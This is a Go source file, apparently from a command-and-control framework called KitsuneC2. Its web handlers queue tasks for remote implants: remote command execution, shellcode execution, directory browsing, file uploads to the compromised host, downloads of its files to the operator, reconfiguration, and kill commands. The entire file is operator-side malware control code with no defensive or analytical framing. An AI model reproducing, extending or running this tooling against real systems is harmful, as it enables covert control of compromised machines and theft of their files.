package web

import (
	"KitsuneC2/lib/communication"
	"KitsuneC2/server/api"
	"errors"
	"io"
	"os"
	"path/filepath"
	"strings"

	"github.com/gin-gonic/gin"
)

var taskTypeToHandlerFunc = map[int]func(c *gin.Context, implant string) error{
	5:  addImplantKill,
	7:  addChangeConfig,
	11: addFileInfo,
	13: addLs,
	15: addExec,
	17: addCd,
	19: addDownload,
	21: addUpload,
	23: addShellcodeExec,
}

var errMissingArgs error = errors.New("missing/invalid arguments")

func addImplantKill(c *gin.Context, implantId string) error {
	var task communication.Task = &communication.ImplantKillReq{}
	_, err := api.AddTaskForImplant(implantId, communication.IMPLANT_KILL_REQ, &task)
	return err
}

func addChangeConfig(c *gin.Context, implantId string) error {
	var config communication.ImplantConfigReq
	if err := c.ShouldBind(&config); err != nil {
		return errMissingArgs
	}

	var task communication.Task = &config
	_, err := api.AddTaskForImplant(implantId, communication.IMPLANT_CONFIG_REQ, &task)
	return err
}

func addFileInfo(c *gin.Context, implantId string) error {
	var fileInfo communication.FileInfoReq
	if err := c.ShouldBind(&fileInfo); err != nil {
		return errMissingArgs
	}

	var task communication.Task = &fileInfo
	_, err := api.AddTaskForImplant(implantId, communication.FILE_INFO_REQ, &task)
	return err
}

func addLs(c *gin.Context, implantId string) error {
	var ls communication.LsReq
	if err := c.ShouldBind(&ls); err != nil {
		return errMissingArgs
	}

	var task communication.Task = &ls
	_, err := api.AddTaskForImplant(implantId, communication.LS_REQ, &task)
	return err
}

func addExec(c *gin.Context, implantId string) error {
	var exec communication.ExecReq
	if err := c.ShouldBind(&exec); err != nil {
		return errMissingArgs
	}

	var task communication.Task = &exec
	_, err := api.AddTaskForImplant(implantId, communication.EXEC_REQ, &task)

	return err
}

func addCd(c *gin.Context, implantId string) error {
	var cd communication.CdReq
	if err := c.ShouldBind(&cd); err != nil {
		return errMissingArgs
	}

	var task communication.Task = &cd
	_, err := api.AddTaskForImplant(implantId, communication.CD_REQ, &task)
	return err
}

func addDownload(c *gin.Context, implantId string) error {
	var download communication.DownloadReq
	if err := c.ShouldBind(&download); err != nil {
		return errMissingArgs
	}
	homeDir, err := os.UserHomeDir()
	if err != nil {
		return errors.New("cannot download remote file to user home directory (are the correct permissions set?)")
	}
	download.Destination = filepath.Join(homeDir, ".kitsuneC2", "remote", implantId, filepath.Base(strings.ReplaceAll(download.Origin, "\\", "/")))

	var task communication.Task = &download
	_, err = api.AddTaskForImplant(implantId, communication.DOWNLOAD_REQ, &task)
	return err
}

func addUpload(c *gin.Context, implantId string) error {
	var upload communication.UploadReq
	dest := c.PostForm("Destination")
	if dest == "" {
		return errMissingArgs
	}

	file, err := c.FormFile("File")
	if err != nil {
		return errMissingArgs
	}

	fileFp, err := file.Open()
	if err != nil {
		return errors.New("could not read file to be uploaded")
	}
	fileData, err := io.ReadAll(fileFp)
	if err != nil {
		return errors.New("could not read file to be uploaded")
	}

	upload.Destination = dest
	upload.File = fileData

	var task communication.Task = &upload
	_, err = api.AddTaskForImplant(implantId, communication.UPLOAD_REQ, &task)
	return err
}

func addShellcodeExec(c *gin.Context, implantId string) error {
	var shellcode communication.ShellcodeExecReq
	if err := c.ShouldBind(&shellcode); err != nil {
		return errMissingArgs
	}

	var task communication.Task = &shellcode
	_, err := api.AddTaskForImplant(implantId, communication.SHELLCODE_EXEC_REQ, &task)
	return err
}
